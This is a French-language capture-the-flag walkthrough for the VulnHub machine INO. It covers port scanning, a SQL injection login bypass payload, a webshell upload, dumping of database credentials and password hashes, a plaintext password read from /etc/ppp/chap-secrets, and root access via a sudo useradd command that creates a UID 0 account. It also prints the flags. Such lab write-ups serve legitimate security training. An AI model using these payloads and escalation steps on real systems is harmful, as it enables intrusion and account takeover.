# Solution du CTF INO de VulnHub

L'auteur du [INO](https://vulnhub.com/entry/ino-101,601/) prévient que le premier accès est facile mais l'escalade de privilèges plus compliquée.

C'est parti pour l'habituel scan de ports :

```
Nmap scan report for 192.168.56.49
Host is up (0.00015s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 deb52389bb9fd41ab50453d0b75cb03f (RSA)
|   256 160914eab9fa17e945395e3bb4fd110a (ECDSA)
|_  256 9f665e71b9125ded705a4f5a8d0d65d5 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-title: Lot Reservation Management System
|_Requested resource was /lot/
|_http-server-header: Apache/2.4.38 (Debian)
```

On a donc une appli nommée *Lot Reservation Management System* qui est présente sur le serveur web.

Une recherche rapide sur exploit-db ressort une faille [Authentication Bypass ](https://www.exploit-db.com/exploits/48934) mais en regardant les détails on voit qu'il s'agit en fait d'une bête vulnérabilité SQL qui affecte le formulaire de login.

Une requête de connexion ressemble d'ailleurs à ceci :

```http
POST /lot/admin/ajax.php?action=login HTTP/1.1
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7,zh-CN;q=0.6,zh;q=0.5
Cache-Control: no-cache
Connection: keep-alive
Content-Length: 24
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Cookie: PHPSESSID=nq4hifmdouvg20o9gqo7mpk1tb
Host: 192.168.56.49
Origin: http://192.168.56.49
Pragma: no-cache
Referer: http://192.168.56.49/lot/admin/login.php
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
X-Requested-With: XMLHttpRequest

username=tes&password=ee


```

J'ai branché *sqlmap* dessus mais étrangement il ne semble pas parvenir à détecter la vulnérabilité, peut être parce que le site semble étrangement instable (*fail2ban* ?)

On peut dans tous les cas bypasser l'authentification comme indiqué dans la page exploit-db en saisissant comme utilisateur et mot de passe :

```txt
' or 1=1 limit 1 -- -+
```

Une fois connecté on trouve différents points où il est possible d'uploader un fichier et aucune vérification sur le type du fichier ne semble être présente. La page *System Settings* est une bonne candidate à l'exploitation puisqu'on peut obtenir l'URL du fichier que l'on vient d'uploader en regardant le code source de la page.

On se sert de notre webshell pour uploader reverse-ssh et on peut ainsi continuer avec un PTY :)

En regardant la liste des process on retrouve effectivement *fail2ban* qui a su faire son boulot correctement.

L'appli web a ses identifiants de BD stockés dans un fichier *db_connect.php* :

```php
<?php 

$conn= new mysqli('localhost','lot','lot','lot_db')or die("Could not connect to mysql".mysqli_error($con));
```

Dans la base SQL un seul utilisateur dont le mot de passe hashé en MD5 est *admin123* :

```sql
www-data@ino:/var/www/html/lot/admin$ mysql -u lot -p lot_db
Enter password: 
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 27584
Server version: 10.3.23-MariaDB-0+deb10u1 Debian 10

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [lot_db]> show tables;
+------------------+
| Tables_in_lot_db |
+------------------+
| division         |
| lots             |
| model_houses     |
| reserved         |
| system_settings  |
| users            |
+------------------+
6 rows in set (0.001 sec)

MariaDB [lot_db]> select * from users;
+----+---------------+----------+----------------------------------+------+
| id | name          | username | password                         | type |
+----+---------------+----------+----------------------------------+------+
|  1 | Administrator | admin    | 0192023a7bbd73250516f069df18b500 |    1 |
+----+---------------+----------+----------------------------------+------+
1 row in set (0.000 sec)
```

Sur le système on remarque l'existence d'un compte Unix baptisé *ppp* qui dispose d'un flag dans son *local.txt* :

`f29cea45f473ebfa834885c4ff70ec1a`

## Damn

A partir de là ça a été effectivement très long de trouver le chemin vers l'utilisateur ppp ou root.

LinPEAS ne remontait rien d'intéressant et [pspy: Monitor linux processes without root permissions](https://github.com/DominicBreuker/pspy) n'avait rien à dire non plus.

J'ai remarqué la présence d'une autre appli web sur le système et j'ai fouillé dans la base pour trouver d'autres identifiants :

```sql
MariaDB [ino]> select username, password from ino_user;
+-----------+--------------------------------------------------------------+
| username  | password                                                     |
+-----------+--------------------------------------------------------------+
| inoerp    | $2y$10$3JUPAxEZlXCilIXNFYw8E.gpZo5DTBPANCDcJ8FchR2ua9DI/cFNq |
| admin     | $2y$10$/WO8Ymjdlqi9EkCwFsacTecUTcANOPmDJF4D6hQwxhnvWXIGNibUu |
| ladmin    | $2y$10$IGPuWvc8UzbgZF.mlIrU1uLtkE/f1UZnT.F6Q1H3ab8z9RVF0CL22 |
| buyer     | $2y$10$ayQHbI49LnalTyF6eCEOp.bOMzRz5E/VnuAxB3yvgfJo06B8lJYoO |
| ani.india | $2y$10$X5cFYAhNsTdp36jXz40aAOI7ZxqXmnWAuT/6lCbI9fehUxj5SyI4i |
| newuser1  | $2y$10$jqavMFfmQzDN5TbqS9AveuZWPC.udVH4r55Yv.Ya4bOh1tmyHz0MK |
+-----------+--------------------------------------------------------------+
6 rows in set (0.001 sec)
```

Mauvaise nouvelle, c'est du bcrypt... j'ai laissé tourner un peu puis j'ai abandonné.

J'ai finalement cherché des références à *ppp* dans le dossier /etc.

```shellsession
www-data@ino:/etc$ grep -l -r ppp . 2> /dev/null 
./passwd-
./ppp/chap-secrets
./ppp/ip-up.d/0000usepeerdns
./ppp/ip-up
./ppp/ipv6-up
./ppp/options
./ppp/ip-down.d/0000usepeerdns
./ppp/ipv6-down
./ppp/ip-down
./group-
./subgid
./subuid
./passwd
./init.d/pppd-dns
./group
./logrotate.d/ppp
```

On a ce fichier *chap-secrets* qui ne devrait pas être lisible :

```shellsession
www-data@ino:/etc$ cat /etc/ppp/chap-secrets 
# Secrets for authentication using CHAP
# client        server  secret                  IP addresses
ppp     *       ESRxd7856HVJB   *
```

Le mot de passe permet de se connecter à cet utilisateur qui a une permission sudo.

```shellsession
ppp@ino:/etc$ sudo -l
Matching Defaults entries for ppp on ino:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User ppp may run the following commands on ino:
    (root) NOPASSWD: /usr/sbin/useradd *
ppp@ino:/etc$ sudo /usr/sbin/useradd -o -u 0 -g 0 -d /root -p '$1$dLrd6la0$eLkYsdbwM3iplQ8HyAe69/' devloop
ppp@ino:/etc$ su devloop
Password:
# cd /root
# ls
proof.txt
# cat proof.txt
21bae0a12690199cde7a65bff57723a5
```

Le hash spécifié pour *adduser* a été généré avec `openssl passwd -1 -stdin`

Ce que je n'ai pas aimé sur ce CTF c'est que l'auteur réutilise un compte système avec des fichiers qui sont déjà par défaut sur le système (*ppp* correspond à *Point to Point Protocol*), ce qui rend compliqué de discerner ce qui est normal et ce qui ne l'est pas (on retrouve le dossier */etc/ppp/* sur tous les systèmes Unix).
